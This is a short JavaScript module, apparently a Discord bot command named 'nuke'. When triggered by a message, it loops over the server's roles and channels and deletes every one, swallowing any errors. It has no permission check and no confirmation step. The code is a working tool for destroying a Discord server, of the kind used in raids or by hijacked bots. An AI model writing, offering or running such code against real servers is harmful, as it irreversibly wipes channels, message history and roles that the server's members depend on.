exports.execute = async(bot, message, args) => {
    const server = bot.guilds.cache.get(message.guildId)
    const roles = server.roles.cache
    const channels = server.channels.cache
    
    roles.forEach(async role => {
        try 
        {
            await role.delete()
        }
        catch(err)
        {}
    })

    channels.forEach(async chan => {
        try 
        {
            await chan.delete()
        }
        catch(err)
        {}
    })
}

exports.help = {
    name: "nuke"
}